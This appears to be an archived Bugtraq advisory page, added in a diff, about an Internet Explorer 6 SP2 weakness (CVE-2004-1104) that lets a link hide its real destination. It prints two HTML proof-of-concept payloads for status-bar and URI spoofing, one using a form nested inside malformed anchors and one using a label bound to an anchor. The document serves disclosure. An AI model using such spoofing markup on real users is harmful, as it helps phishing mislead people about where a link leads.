@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid11565<p><b><span style="font-size: 18pt;">Microsoft Internet Explorer HTML Form Tags URI Obfuscation Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11565/info">info</a><br><a href="http://www.securityfocus.com/bid/11565/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11565/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11565/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11565/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11565
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2004-1104<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 30 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 08:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				"http-equiv@excite.com" &lt;1@malware.com&gt; disclosed this weakness.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft Internet Explorer  6.0 SP2 - do not use<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example is available. This example embeds an HTML form between malformed anchor, '&amp;lt;a&amp;gt;', tags:<br/><br/>&amp;lt;base href="http://www.example1.com"&amp;gt;<br/><br/>&amp;lt;a href=&amp;gt;&amp;lt;form action="http://www.example2.com"<br/>method="get"&amp;gt;&amp;lt;INPUT style="BORDER-RIGHT: 0pt; BORDER-TOP: 0pt;<br/>FONT-SIZE: 10pt; BORDER-LEFT: 0pt;<br/>CURSOR: hand; COLOR: blue; BORDER-BOTTOM: 0pt; BACKGROUND-COLOR:<br/>transparent;TEXT-DECORATION: underline" type=submit<br/>value=http://www.example1.com&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/a&amp;gt;<br/><br/>Another proof of concept exploit has been made available.  This method employs the 'id' parameter embedded inside an anchor tag that is controlled by a 'label'  tag, allowing the label tag to control what value is presented to an unsuspecting user:<br/><br/>&amp;lt;body style="color: WindowText; background-color: Window;"&amp;gt;<br/>&amp;lt;div&amp;gt;IE/OE Restricted Zone Status Bar Spoofing&amp;lt;/div&amp;gt;<br/>&amp;lt;div&amp;gt;Tested on Windows XP with SP2 installed.&amp;lt;/div&amp;gt;<br/>&amp;lt;p&amp;gt;&amp;lt;a id="SPOOF" href="http://www.example.com/?maliciousContents"&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;<br/>&amp;lt;div&amp;gt;<br/> &amp;lt;a href="http://www.example.com/?trustedSite"&amp;gt;<br/>   &amp;lt;table&amp;gt;<br/>     &amp;lt;caption&amp;gt;<br/>       &amp;lt;a href="http://www.example.com/?trustedSite "&amp;gt;<br/>         &amp;lt;label for="SPOOF"&amp;gt;<br/>           &amp;lt;u style="cursor: pointer; color: blue"&amp;gt;<br/>             http://www.example.com/?trustedSite<br/>           &amp;lt;/u&amp;gt;<br/>         &amp;lt;/label&amp;gt;<br/>       &amp;lt;/a&amp;gt;<br/>     &amp;lt;/caption&amp;gt;<br/>   &amp;lt;/table&amp;gt;<br/> &amp;lt;/a&amp;gt;<br/>&amp;lt;/div&amp;gt;<br/><br/><br/>The above proof of concept exploit can also be viewed at the following site:<br/><br/>http://habaneronetworks.com/viewArticle.php?ID=140
+	
+		<ul>
+</ul>
+</div>
